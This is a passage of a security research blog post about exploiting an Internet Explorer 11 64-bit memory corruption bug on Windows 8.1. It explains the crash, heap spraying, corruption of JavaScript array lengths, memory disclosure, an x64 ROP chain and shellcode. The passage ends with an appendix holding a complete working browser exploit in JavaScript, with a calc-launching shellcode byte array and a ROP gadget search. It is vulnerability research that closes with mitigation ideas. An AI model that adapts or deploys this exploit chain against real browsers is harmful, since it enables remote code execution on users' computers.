The value of rdx at the time of crash comes after several assignments from the value of ebp which is initialized to 0xFFFFFFFF near the beginning of the function (note that ebp/rbp is not used as the frame pointer here). My assumption is that the value 0xFFFFFFFF (-1) is an initial value of variable used as an index into CFormatCache. Later in the code, a pointer to a CTreeNode is obtained, a flag in the CTreeNode is examined and if it is set, the index value is copied from the CTreeNode object. However, if the flag is not set (as is the case in the PoC), the initial value is used. The value 0xFFFFFFFF is then split into two parts, upper and lower (it looks like CFormatCache is implemented as a 2D array). A value of the higher index (will be equal to 0x1ffffff) will be multiplied by 8 (size of void\*), this offset is added to rax and the content at this memory location is written back to rax. Then, a value of the lower index (will be 0x7f) is multiplied with 24 (presumably the size of CCharFormat element), this offset is added to eax and the content of this memory location is written to rdx. Finally, and this is the part relevant for exploitation, a number at [rdx+0C] is taken, increased, and then written back to [rdx+0C].

Written in C++ and simplified a bit, the relevant code would look like this:

```
int cacheIndex = -1;
if(treeNode->flag) {
  cacheIndex = treeNode->cacheIndex;
}
unsigned int index_hi = cacheIndex, index_lo = cacheIndex;
index_hi = index_hi >> 7;
index_lo = index_lo & 0x7f;
//with sizeof(formatCache[i]) == 8 and sizeof(formatCache[i][j]) == 24
formatCache[index_hi][index_lo].some_number++;

```

For practical exploitation purposes, what happens is this: A pointer to valid memory (CFormatCache pointer) is increased by 0x0FFFFFF8 (256M) and the value at this address is treated as another pointer. Let’s call the address (CFormatCache address + 0x0FFFFFF8) P1 and the address it points to P2. The DWORD value at (P2 + BF4) will be increased by 1 (Note: BF4 is computed as 0x7F \* 3 \* 8 + 0x0C).

***The exploit***

If we were writing an exploit for a 32-bit process, a straightforward (though not very clean) way to exploit the bug using heap spraying would be to spray with a 32-bit number such that when BF4 is added to it, an address of something interesting (e.g. string or array length) is obtained. An “address of something interesting” could be predicted by having another heap spray consisting of “interesting objects”.

Since the exploit is being written for 64-bit process with full ASLR, we won’t know or be able to guess an address of an “interesting” object. We certainly won’t be able to fill an address space of a 64-bit process and heap base will be randomized, thus making addresses of objects on the heap unpredictable.

***Heap spraying lives***

However, even in this case, heap spraying is still useful for the first part of the exploit. Note that when triggering the bug, P1 is calculated as a valid heap address increased by 0x0FFFFFF8 (256M). And if we heap spray, we are allocating memory relative to the heap base. Thus, by spraying approximately 256M of memory we can set P2 to arbitrary value.

So to conclude, despite significantly larger address space in 64-bit processes and heap base randomization, heap spraying is still useful in cases where we can make a vulnerable application dereference memory at a valid heap address + a large offset. As this is a typical behavior for bounds checking vulnerabilities, it’s not altogether uncommon. Besides the bug being discussed here, the previous IE bug I wrote about exploiting [here](http://ifsec.blogspot.com/2012/02/reliable-windows-7-exploitation-case.html) also exhibits this behavior.

Although heap spraying is often avoided in modern exploits in favor of the more reliable alternatives, given a large (fixed) offset of 256M, it is pretty much required in this case. And although the offset is fixed, it’s a pretty good value as far as heap spraying goes. Not too large to cause memory exhaustion and not too small to cause major reliability issues (other than those from using heap spraying in the first place).

***Look Ma, no Flash***

But the problem of not being able to guess an address of an interesting object still remains, and thus the question is, what do we heap spray with? Well, instead of heap spraying with the exact values, we can spray with pointers instead. Since an offset of 0xBF4 is added to P2 before increasing the value it points to, we’ll spray with an address of some object and try to make this address + 0xBF4 point to something of interest.

So what should “something of interest” be? The first thing I tried is a length of a JavaScript string as in [here](http://ifsec.blogspot.com/2012/02/reliable-windows-7-exploitation-case.html). And although I was able to align the stars to overwrite higher dword of a qword containing a string length, a problem arose: JavaScript string length is treated as a 32-bit number. Note that most pointers (including those we can easily use in our heap spray) on 64-bit will be qword aligned and when adding an offset of 0xBF4 to such a pointer we will end up with a pointer to higher dword in a qword-aligned memory. So an interesting value needs to either be 64-bit or not qword aligned.

Another idea was to try to overwrite an address. However, note that triggering the bug would increase the address by 4GB as (assuming a qword-aligned address) we are increasing the higher dword. To control the content at this address we would need another heap spray of ~4G data and this would cause memory issues on computers with less free RAM than that. Incidentally, the computer I ran Windows 8.1 Preview VM on had only 4GB of RAM and the Windows 8.1 VM had just 2GB of RAM so I decided to drop this idea and look at alternatives.

In several recent exploits used in the wild, a length of a Flash array was overwritten to leverage a vulnerability. While Flash was off limits in this exercise, let’s take a look at JavaScript arrays in IE 11 instead. As it turns out, there is an interesting value that is correctly aligned. An example JavaScript Array object with explanation of some of the fields is shown below. Note that the actual array content may be split across several buffers.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMBNIOwqfO3IRkVfI_nTiJpHVZsLJG7K25SQV4T77ZKU4a3JgdJ4Cyk8dHKDqEYo7VQKpBNOSstQm4zJCQnhS724N0UHBcDwMXug7XwzUVZFxFNhkkxKd6RNvyILGICiPlX1lts_kyvjo/s1600/array.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMBNIOwqfO3IRkVfI_nTiJpHVZsLJG7K25SQV4T77ZKU4a3JgdJ4Cyk8dHKDqEYo7VQKpBNOSstQm4zJCQnhS724N0UHBcDwMXug7XwzUVZFxFNhkkxKd6RNvyILGICiPlX1lts_kyvjo/s1600/array.png)

offset:0, size:8 vtable ptr

offset:0x20, size:4 array length

offset:0x28, size:8 pointer to the buffer containing array data

[beginning of the first buffer, stored together with the array]

offset:0x50, size:4 index of the first element in this buffer

offset:0x54, size:4 number of elements currently in the buffer

offset:0x58, size:4 buffer capacity

offset:0x60, size:8 ptr to the next buffer

offset:0x68, size:varies array data stored in the buffer

Although it’s not necessary for understanding the exploit, here’s also an example String object with explanation of some of the fields.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrUd5hyF1ObOFblc2xkxbb8E5xHWMNXEItE0wydBskgC1yohMZtX7sQhaIuhW9rZKMS5p2cGDncoAh37jJukn-xFAUxIFRN5XLBRfJEqxHSM3TFlaregGvXU0STcrD65_9PkcXMHiLHqA/s1600/string.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrUd5hyF1ObOFblc2xkxbb8E5xHWMNXEItE0wydBskgC1yohMZtX7sQhaIuhW9rZKMS5p2cGDncoAh37jJukn-xFAUxIFRN5XLBRfJEqxHSM3TFlaregGvXU0STcrD65_9PkcXMHiLHqA/s1600/string.png)

offset:0, size:8 vtable ptr

offset:0x10, size:4 string length

offset:0x18, size:8 data ptr

As can be seen from above, the “number of elements currently in the buffer” of a JavaScript array is not qword-aligned and is a value that might be interesting to overwrite.

This is indeed the value I ended up going for. To accomplish this, I got the memory aligned as seen in the image below.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhk0hhDAIRiQxGhREylhFgRT0VQFcemj-gtrtH6IGyGjv2i1_xidVgpmlKeWwC8zuTCoQTA77Oy-mSQTRrcKApMkIejdus4j9GNlyz1BPcaN-hiRPeyBkm_sfCpDDai4NqbCOUoqsjV84s/s1600/mem.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhk0hhDAIRiQxGhREylhFgRT0VQFcemj-gtrtH6IGyGjv2i1_xidVgpmlKeWwC8zuTCoQTA77Oy-mSQTRrcKApMkIejdus4j9GNlyz1BPcaN-hiRPeyBkm_sfCpDDai4NqbCOUoqsjV84s/s1600/mem.png)

We’ll heap spray with pointers to a JavaScript String object by creating large JavaScript arrays where each element of the array will be the same string object. We’ll also get memory aligned in such a way that, at an offset 0xBF4 from the start of the string, there will be a a part of a JavaScript array that holds the value we want to overwrite.

You might wonder why I heap sprayed with pointers to String and not an Array object. The reason for this is that the String object is much smaller (32 bytes vs. 128 bytes) so by having multiple strings close to one another and pointing to a specific one, we can better “aim” for a specific offset inside an Array object. Of course, if we have several strings close to one another, the question becomes which one to use in a heap spray. Since an Array object is 4 time the size of a String, there are four different offsets in the Array we can overwrite. By choosing randomly, in one case (with probability 1/4), we will overwrite exactly what we want. In one case, we will overwrite an address that will cause a crash on a subsequent access of the array. And in the remaining two cases, we will overwrite values that are not important and we would be able to try again by spraying with a pointer to a different string. Thus a blind guess will give success probability of 1/4 while a try/retry approach would give a probability of success of 3/4 (if you know your statistics, you might think that this number is wrong, but we can actually avoid crashes after an incorrect but non-fatal attempt by trying different strings in a descending order). An even better approach would be to disclose the string offsets by first aligning memory in a way to put something readable at an offset 0xBF4 from the String object used in the heap spray. While I have observed that this is possible, this isn’t implemented in the provided exploit code and is left as an exercise for the reader. Refer to the next section for information that could help you to achieve such alignment.

In the exploit code provided, a naive (semi)blind-guess approach is used where there is a large array of Strings (strarr) and a string at a constant index is used for the heap spray. I have observed that this works reliably for me when opening the PoC in a new process/tab (so I didn’t have any other JavaScript objects in the current process). If you want to play with the exploit and the index I used doesn’t work for you, you’ll likely need to pick a different one or implement one of the approaches described above.

***Feng Shui in JavaScript heap***

Before moving on with the exploit, let’s first take some time to examine how it’s possible to heap spray in IE11 and get a correct object alignment on heap with a high reliability.

Firstly, heap spraying: While Microsoft has made it rather difficult to heap spray with JavaScript strings, JavaScript arrays in IE11 appear not to prevent this in any way. It’s possible to spray both with pointers (as seen above) as well as with absolute values by e.g. creating a large array of integers. While many recent IE exploits use Flash for heap spraying, it’s not necessary and, given the current Array implementation and improved speed over the predecessors, JavaScript arrays might just be the object of choice to implement heap spraying in IE in the future.

Secondly, alignment of objects on heap: While the default Heap implementation in Windows 8 and above (the low fragmentation heap) includes several mitigations that make getting the desired alignment difficult, such as guard pages and allocation order randomization, in IE11 basic JavaScript objects (such as Arrays and Strings) use a custom heap implementation that has none of these features.

I’ll shortly describe what I observed about this JavaScript heap implementation. Note that all of the below is based on observation of the behavior and not reverse-engineering the code, so I might have made some wrong conclusions, but it works as described for the purposes of the given exploit.

The space for the JavaScript objects is allocated in blocks of 0x20000 bytes. If more space is needed, additional blocks will be allocated and there is nothing preventing these blocks to be right next to one another (so a theoretical overflow in one block could write into another).

These blocks are further divided into bins of 0x1000 bytes (at least for small objects). One bin will only hold objects of the same size and possibly type. So for example, in this exploit where we have String and Array objects of size 32 and 128 bytes respectively, some bins will hold only String objects (128 of them at most), while some of them will hold only Array objects (32 of them at most). When a bin is fully used, it contains only the “useful” content and no metadata. I have also observed that the objects are stored in separate 0x20000-size blocks than the user-provided content, so string and array data will be stored in different blocks than the corresponding String and Array objects, except when the data is small enough to be stored together with the object (e.g. single-character strings, small arrays like the 5-element ones in the exploit).

The allocation order of objects inside a given bin is sequential. That means that, e.g. if we create three String objects in close succession and assuming no holes in any of the bins, they will be next to each other with the first one having the lowest address, followed by the second followed by the third.

***And now, for my next trick***

So at this point we can increment the number of elements in the JavaScript array. In fact, we’ll trigger the vulnerability multiple times (5 times in the provided exploit, where each trigger will increase this number by 3) in order to increase it a bit more. Unfortunately, increasing the number of elements does not allow us to write data past the end of the buffer, but it does allow us to read data past the end. This is sufficient at this point because it allows us to break ASLR and learn the precise address of the Array object we overwrote.

Knowing the address of the Array object, we can repeat the heap spray, but this time, we’ll spray with exact values (I used Array of integers to spray with the exact values). A value we are going to spray with is going to be an address of buffer capacity of an array decreased by 0xBF1. This means that that the spray value + 0xBF4 will be the address of the highest byte of the buffer capacity value. After the buffer capacity has been overwritten, we’ll be able to both read and write data past the end of the JS Array’s buffer.

From here, we can quite easily get the two important elements that constitute a modern browser exploit: The ability to read arbitrary memory and to gain control over RIP.

We can read arbitrary memory by scanning the memory after the Array for a String object and then overwriting the data pointer and (if we want to read larger data) size of the string.

We can get control over RIP by overwriting a vtable pointer of a nearby Array object and triggering a virtual method call. While IE10 introduced Virtual Table Guard (vtguard) for some classes in mshtml.dll, jscript9.dll has no such protections. However note that, having arbitrary memory disclosure, even if vtguard was present it would be just a minor annoyance.

***64-bit exploits for 32-bit exploit writers***

With control over RIP and memory disclosure, we’ll want to construct a ROP chain in order to defeat DEP. As we don’t control the stack, the first thing we need is a stack pivot gadget. So, with arbitrary memory disclosure it should be easy to search for xchg rax,rsp; ret; in some executable module, right? Well, no. As it turns out, in x64, stack pivot gadgets are much less common than in x86 code. On x86, xchg eax,esp; ret; will be just 2 bytes in size, so there will be many unintended sequences like that. On x64 xchg rax,rsp; is 3 bytes which makes it much less common. Having not found it (or any other “clean” stack pivot gadgets) in mshtml.dll and jscript9.dll, I had to look for alternatives. After a look at mshtml.dll I found a stack pivot sequence shown below which isn’t very clean but does the trick assuming both rax and rcx point to a readable memory (which is the case here).

```
00007ffb`265ea973 50              push    rax
00007ffb`265ea974 5c              pop     rsp
00007ffb`265ea975 85d2            test    edx,edx
00007ffb`265ea977 7408            je      MSHTML!CTableLayout::GetLastRow+0x25 (00007ffb`265ea981)
00007ffb`265ea979 8b4058          mov     eax,dword ptr [rax+58h]
00007ffb`265ea97c ffc8            dec     eax
00007ffb`265ea97e 03c2            add     eax,edx
00007ffb`265ea980 c3              ret
00007ffb`265ea981 8b8184010000    mov     eax,dword ptr [rcx+184h]
00007ffb`265ea987 ffc8            dec     eax
00007ffb`265ea989 c3              ret

```

Note that, while there is a conditional jump in the sequence, both branches end with RET and won’t cause a crash so they both work well for our purpose. While the exploit mostly relies on jscript9 objects, an address of (larger) mshtml.dll module can be easily obtained using memory disclosure by pushing a mshtml object into a JS array object we can read and then following references from the array to mshtml object and its vtable.

After the control of the stack is gained, we can call VirtualProtect to make a part of heap we can write to executable. We can find the address of VirtualProtect in the IAT of mshtml.dll (the exploit includes some very basic PE32+ parsing). So, with the address of VirtualProtect and control over the stack, we can now just put the correct arguments of on the stack and return into VirtualProtect, right? Well, no. In 64-bit Windows, a different calling convention is used than in 32-bit. 64-bit Windows uses a fastcall convention where the first 4 arguments (which is exactly the number of arguments VirtualProtect has) are passed through registers RCX, RDX, R8 and R9 (in that order). So we need some additional gadgets to load the correct argument into the correct registers:

```
pop rcx; ret;
pop rdx; ret;
pop r8; ret;
pop r9; ret;

```

As it turns out the first three are really common in mshtml.dll. The forth one isn’t, however for VirtualProtect the last argument just needs to point to a writeable memory which is already the case at the time we get control over RIP, so we don’t actually have to change r9.

The final ROP chain looks like this:

```
address of pop rcx; ret;
address on the heap block with shellcode
address of pop rdx; ret;
0x1000 (size of the memory that we want to make executable)
address of pop r8; ret;
0x40 (PAGE_EXECUTE_READWRITE)
address of VirtualProtect
address of shellcode

```

So, we can now finally execute some x64 shellcode like [SkyLined’s x64 calc shellcode](https://code.google.com/p/win-exec-calc-shellcode/) that works on 64-bit Windows 7 and 8, right? Well, no. Shellcode authors usually (understandably) prefer small shellcode size over generality and save space by relying on specifics of the OS that don’t need to be true in the future versions. For example, for compatibility reasons, Windows 7 and 8 store PEB, module information structures as well as ntdll and kernel32 modules at addresses lower than 2G. This is no longer true in Windows 8.1 Preview. Also, while Windows x64 fastcall calling convention requires leaving 32 bytes of shadow space on the stack for the use of calling function, SkyLined’s win64-exec-calc-shellcode leaves just 8 bytes before calling WinExec. While this appears to work on Windows 7 and 8, on Windows 8.1 preview it will cause the command string (“calc” in this case) stored on the stack to be overwritten as it will be stored in WinExec’s shadow space. To resolve these compatibility issues I made modifications to the shellcode which I provided in the exploit. It should now work on Windows 8.1.

That’s it, finally we can execute the shellcode and have thus proven arbitrary code execution. As IE is fully 64-bit only in the touch screen mode, I don’t have a cool screenshot of Windows Calculator popped over it (calc is shown on the desktop instead). But I do have a screenshot of the desktop with IE forced into a single 64-bit process.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2lh3ADX5pBUcuwtuY8FVsGtY9Pni6cKmBuBDI46JkEi8b9fYh0KRtNARG031oQz9ZD1yAVtPDklNIaeM7NjBhiAr8Np2uypODko8gd1aObCW5T9id34zhk1j29bZtM7PBGpqMFDKUlvk/s1600/screenshot.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2lh3ADX5pBUcuwtuY8FVsGtY9Pni6cKmBuBDI46JkEi8b9fYh0KRtNARG031oQz9ZD1yAVtPDklNIaeM7NjBhiAr8Np2uypODko8gd1aObCW5T9id34zhk1j29bZtM7PBGpqMFDKUlvk/s1600/screenshot.png)

The full exploit code can be found at the end of this blog post.

***Conclusion***

Although Windows 8/8.1 packs an [impressive arsenal of memory corruption mitigations](http://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf), memory corruption exploitation is still alive and kicking. Granted, some vulnerability classes might be more difficult to exploit, but the vulnerability presented here was the first one I found in IE11 and there are likely many more vulnerabilities that can be exploited in a similar way. The exploit also demonstrates that, under some conditions, heap spraying is still useful even in 64-bit processes. In general, while there have been a few cases where it was more difficult to write parts of the exploit on x64 than it would be on x86 (such as finding what to spray with and overwrite, finding stack pivot sequences etc.), the difficulties wouldn't be sufficient to stop a determined attacker.

Finally, based on what I've seen, here are a few ideas to make writing exploits for IE11 on Windows 8.1 more difficult:

* Consider implementing protection against heap spraying with JavaScript arrays. This could be implemented by RLE-encoding large arrays that consist of a single repeated value or several repeated values.
* Consider implementing the same level of protection for the JavaScript heap as for the default heap implementation - add guard pages and introduce randomness.
* Consider implementing Virtual Table Guard for common JavaScript objects.
* Consider making compiler changes to remove all stack pivot sequences from the generated code of common modules. These are already scarce in x64 code so there shouldn't be a large performance impact.

***Appendix: Exploit Code***

```
<script>

 var magic = 25001; //if the exploit doesn't work for you try selecting another number in the range 25000 -/+ 128
 var strarr = new Array();
 var arrarr = new Array();
 var sprayarr = new Array();
 var numsploits;
 var addrhi,addrlo;
 var arrindex = -1;
 var strindex = -1;
 var strobjidx = -1;
 var mshtmllo,mshtmlhi;

 //calc shellcode, based on SkyLined's x64 calc shellcode, but fixed to work on win 8.1
 var shellcode = [0x40, 0x80, 0xe4, 0xf8, 0x6a, 0x60, 0x59, 0x65, 0x48, 0x8b, 0x31, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x4f, 0x3c, 0x8b, 0x5c, 0x0f, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe, 0x8b, 0x4c, 0x1f, 0x24, 0x48, 0x01, 0xf9, 0x31, 0xd2, 0x0f, 0xb7, 0x2c, 0x51, 0xff, 0xc2, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xf0, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x31, 0xd2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd7, 0xcc, 0, 0, 0, 0];

//triggers the bug
function crash(i) {
 numsploits = numsploits + 1;
 t = document.getElementsByTagName("table")[i];
 t.parentNode.runtimeStyle.posWidth = -1;
 t.focus();
 setTimeout(cont, 100);
}

//heap spray
function spray() {
 var aa = "aa";

 //create a bunch of String and Array objects
 for(var i=0;i<50000;i++) {
   strarr[i] = aa.toUpperCase();
   arrarr[i] = new Array(1,2,3,4,5);
 }

 //heap-spray with pointers to a String object
 for(var i=0;i<2000;i++) {
   var tmparr = new Array(16000);
   for(var j=0;j<16000;j++) {
     tmparr[j] = strarr[magic];
   }
   sprayarr[i] = tmparr;
 }

 crash(0);
}

function cont() {
 if(numsploits < 5) {
   crash(numsploits);
   return;
 }
 if(numsploits < 6) {
   setTimeout(afterFirstOverwrite, 0);
   return;
 }
 //alert("done2");
 afterSecondOverwrite();
}

function afterFirstOverwrite() {
 //check which array was overwritten
 for(var i=24000;i<25000;i++) {
   arrarr[i][18] = 1;
   var a = arrarr[i][4];
   var b = arrarr[i][16];
   var c = arrarr[i][17];
   if(typeof(b)!="undefined") {
     arrindex = i;
     addrlo = b;
     addrhi = c;
     break;
   }
 }
 if(arrindex < 0) {
   alert("Exploit failed, error overwriting array");
   return;
 }
 //alert(arrindex);

 //re-spray to overwrite buffer capacity
 for(var i=0;i<2000;i++) {
   sprayarr[i] = new Array(32000);
 }
 CollectGarbage();
 for(var i=0;i<2000;i++) {
   for(var j=0;j<32000;j++) {
     if(j%2 == 0) {
       sprayarr[i][j] = addrlo + 8 - 0xBF4 + 3;
     } else {
       sprayarr[i][j] = addrhi;
     }
   }
 }
 //alert("done");
 crash(numsploits);
}

//unsigned to signed conversion
function u2s(i) {
 if(i>0x80000000) {
   return -(0xFFFFFFFF - i + 1);
 } else {
   return i;
 }
}

//signed to unsigned conversion
function s2u(i) {
 if(i<0) {
   return (0xFFFFFFFF + i + 1);
 } else {
   return i;
 }
}

//memory disclosure helper function, read 32-bit number from a given address
function read32(addrhi, addrlo) {
 arrarr[arrindex][strobjidx + 6] = u2s(addrlo);
 arrarr[arrindex][strobjidx + 7] = addrhi;
 return strarr[strindex].charCodeAt(0) + 0x10000 * strarr[strindex].charCodeAt(1);
}

//memory disclosure helper function, read 16-bit number from a given address
function read16(addrhi, addrlo) {
 arrarr[arrindex][strobjidx + 6] = u2s(addrlo);
 arrarr[arrindex][strobjidx + 7] = addrhi;
 return strarr[strindex].charCodeAt(0);
}

function afterSecondOverwrite() {
 arrindex = arrindex + 1;
 //adjusts the array length - gives us some space to read and write memory
 arrarr[arrindex][2+0x5000/4] = 0;
 //search for the next string object and overwrite its length and content ptr to write jscript9
 for(var i=1;i<=5;i++) {
   if((arrarr[arrindex][2 + i*0x400 - 0x20] == 2) && (arrarr[arrindex][3 + i*0x400 - 0x20] == 0)) {
     //alert("found");
     strobjidx = i*0x400 - 0x20 - 2;
     arrarr[arrindex][strobjidx+4] = 4;
     for(var j=20000;j<30000;j++) {
       if(strarr[j].length != 2) {
         strindex = j;
         break;
       }
     }
     break;
   }
 }
 if(strindex < 0) {
   alert("Exploit failed, couldn't overwrite string length");
   return;
 }
 //alert("mshtml");

 //create a mshtml object and follow references to its vtable ptr
 var lo1,hi1,lo2,hi2;
 arrarr[arrindex+1][0] = document.createElement("button");
 lo1 = s2u(arrarr[arrindex][6+0x28/4]);
 hi1 = arrarr[arrindex][6+0x28/4 + 1];
 lo2 = read32(hi1, lo1+0x18);
 hi2 = read32(hi1, lo1+0x18+4);
 mshtmllo = read32(hi2, lo2+0x20);
 mshtmlhi = read32(hi2, lo2+0x20+4);
 //find the module base
 mshtmllo = mshtmllo - mshtmllo % 0x1000;
 while(mshtmllo>0) {
   if(read16(mshtmlhi,mshtmllo) == 0x5A4D) break;
   mshtmllo = mshtmllo - 0x1000;
 }

 //find the address of VirtualProtect in the IAT
 var coff = read32(mshtmlhi, mshtmllo + 0x3C);
 var idata = read32(mshtmlhi, mshtmllo + coff + 4 + 20 + 120);
 var iat = read32(mshtmlhi, mshtmllo + idata + 16);
 var vplo =  read32(mshtmlhi, mshtmllo + iat + 0x8a8);
 var vphi =  read32(mshtmlhi, mshtmllo + iat + 0x8a8 + 4);
 //alert(mshtmlhi.toString(16)+"'"+mshtmllo.toString(16)+","+vplo.toString(16));

 //find the rop gadgets in mshtml
 var pivotlo = -1;
 arrarr[arrindex][strobjidx + 4] = 0x01000000;
 arrarr[arrindex][strobjidx + 6] = u2s(mshtmllo);
 arrarr[arrindex][strobjidx + 7] = mshtmlhi;
 for(var i=0x800;i<0x900000;i++) {
   if((strarr[strindex].charCodeAt(i) == 0x5C50)
     &&(strarr[strindex].charCodeAt(i+1) == 0xD285)
     &&(strarr[strindex].charCodeAt(i+2) == 0x0874)
     &&(strarr[strindex].charCodeAt(i+3) == 0x408b))
   {
     pivotlo = mshtmllo + i*2;
     break;
   }
   if((strarr[strindex].charCodeAt(i) == 0x508B)
     &&(strarr[strindex].charCodeAt(i+1) == 0x855C)
     &&(strarr[strindex].charCodeAt(i+2) == 0x74D2)
     &&(strarr[strindex].charCodeAt(i+3) == 0x8b08))
   {
     pivotlo = mshtmllo + i*2 + 1;
     break;
   }
 }
 if(pivotlo < 0) {
   alert("Exploit failed, couldn't find ROP gadgets");
   return;
 }
 //alert(pivotlo.toString(16));

 var poprcx = -1;
 for(var i=0x800;i<0x900000;i++) {
   if(strarr[strindex].charCodeAt(i) == 0xC359) {
     poprcx = mshtmllo + i*2;
     break;
   }
 }
 if(poprcx < 0) {
   alert("Exploit failed, couldn't find ROP gadgets");
   return;
 }

 var poprdx = -1;
 for(var i=0x800;i<0x900000;i++) {
   if(strarr[strindex].charCodeAt(i) == 0xC35A) {
     poprdx = mshtmllo + i*2;
     break;
   }
 }
 if(poprdx < 0) {
   alert("Exploit failed, couldn't find ROP gadgets");
   return;
 }

 var popr8 = -1;
 for(var i=0x800;i<0x900000;i++) {
   if((strarr[strindex].charCodeAt(i) == 0x5841) && (strarr[strindex].charCodeAt(i+1) % 256 == 0xC3)) {
     popr8 = mshtmllo + i*2;
     break;
   }
   if((Math.floor(strarr[strindex].charCodeAt(i)/256) == 0x41) && (strarr[strindex].charCodeAt(i+1) == 0xC358)) {
     popr8 = mshtmllo + i*2 + 1;
     break;
   }
 }
 if(popr8 < 0) {
   alert("Exploit failed, couldn't find ROP gadgets");
   return;
 }

 //prepare the fake vtable
 var eaxoffset = 6 + 0x20;
 arrarr[arrindex][eaxoffset + 0x98/4] = u2s(pivotlo);
 arrarr[arrindex][eaxoffset + 0x98/4 + 1] = mshtmlhi;
 //prepare the fake stack
 arrarr[arrindex][eaxoffset] = u2s(poprcx);
 arrarr[arrindex][eaxoffset + 1] = mshtmlhi;
 arrarr[arrindex][eaxoffset + 2] = addrlo;
 arrarr[arrindex][eaxoffset + 3] = addrhi;
 arrarr[arrindex][eaxoffset + 4] = u2s(poprdx);
 arrarr[arrindex][eaxoffset + 5] = mshtmlhi;
 arrarr[arrindex][eaxoffset + 6] = 0x1000;
 arrarr[arrindex][eaxoffset + 7] = 0;
 arrarr[arrindex][eaxoffset + 8] = u2s(popr8);
 arrarr[arrindex][eaxoffset + 9] = mshtmlhi;
 arrarr[arrindex][eaxoffset + 10] = 0x40;
 arrarr[arrindex][eaxoffset + 11] = 0;
 arrarr[arrindex][eaxoffset + 12] = u2s(vplo);
 arrarr[arrindex][eaxoffset + 13] = u2s(vphi);
 arrarr[arrindex][eaxoffset + 14] = addrlo + 24 + eaxoffset*4 + 50*4;
 arrarr[arrindex][eaxoffset + 15] = addrhi;

 //encode the shellcode
 for(var i=0;i<Math.floor(shellcode.length/4);i++) {
    arrarr[arrindex][eaxoffset + 50 + i] = u2s(shellcode[i*4+3]*0x1000000 + shellcode[i*4+2]*0x10000 + shellcode[i*4+1]*0x100 + shellcode[i*4]);
 }

 //overwrite a vtable of jscript9 object and trigger a virtual call
 arrarr[arrindex][7] = addrhi;
 arrarr[arrindex][6] = addrlo + 24 + eaxoffset*4;
 //arrarr[arrindex][7] = 0x123456;
 //arrarr[arrindex][6] = 0x123456;

 //alert("done3");
 arrarr[arrindex+1].blah();
}

function run() {
 numsploits = 0;
 window.setTimeout(spray, 1000);
}

</script>
<body onload=run()>
<form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
<form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
<form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
<form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
<form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
<form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
</body>

```

Posted by

[Ivan Fratric](https://www.blogger.com/profile/03011648433786848352 "author profile")

at

[11:42 AM](https://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html "permanent link")

[360 comments:](https://www.blogger.com/comment/fullpage/post/2001595886969899899/2038989796339224911)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=2001595886969899899&postID=2038989796339224911&from=pencil "Edit Post")

[Older Posts](https://ifsec.blogspot.com/search?updated-max=2013-11-06T11:42:00-08:00&max-results=7 "Older Posts")

[Home](https://ifsec.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://ifsec.blogspot.com/feeds/posts/default)

## About Me

Ivan Fratric currently works as an information security engineer at a large software company. Before that, he was a research and teaching assistant at the University of Zagreb and a security enthusiast, as documented on this blog.
The opinions expressed herein are my own and do not represent my employer’s views in any way.

## Contact details

You can contact me at

ifsecure at gmail dot com

You can also follow me on [Twitter](http://twitter.com/#!/ifsecure)

## Blog Archive

* ▼
  [2018](https://ifsec.blogspot.com/2018/)
  (1)
  + ▼
    [February](https://ifsec.blogspot.com/2018/02/)
    (1)
    - [So you want to work in security? (and for some rea...](https://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html)

* ►
  [2015](https://ifsec.blogspot.com/2015/)
  (1)
  + ►
    [June](https://ifsec.blogspot.com/2015/06/)
    (1)

* ►
  [2013](https://ifsec.blogspot.com/2013/)
  (1)
  + ►
    [November](https://ifsec.blogspot.com/2013/11/)
    (1)

* ►
  [2012](https://ifsec.blogspot.com/2012/)
  (7)
  + ►
    [September](https://ifsec.blogspot.com/2012/09/)
    (1)
  + ►
    [August](https://ifsec.blogspot.com/2012/08/)
    (1)
  + ►
    [June](https://ifsec.blogspot.com/2012/06/)
    (2)
  + ►
    [May](https://ifsec.blogspot.com/2012/05/)
    (1)
  + ►
    [March](https://ifsec.blogspot.com/2012/03/)
    (1)
  + ►
    [February](https://ifsec.blogspot.com/2012/02/)
    (1)

* ►
  [2011](https://ifsec.blogspot.com/2011/)
  (3)
  + ►
    [October](https://ifsec.blogspot.com/2011/10/)
    (2)
  + ►
    [June](https://ifsec.blogspot.com/2011/06/)
    (1)

* ►
  [2010](https://ifsec.blogspot.com/2010/)
  (1)
  + ►
    [October](https://ifsec.blogspot.com/2010/10/)
    (1)

* ►
  [2009](https://ifsec.blogspot.com/2009/)
  (3)
  + ►
    [October](https://ifsec.blogspot.com/2009/10/)
    (2)
  + ►
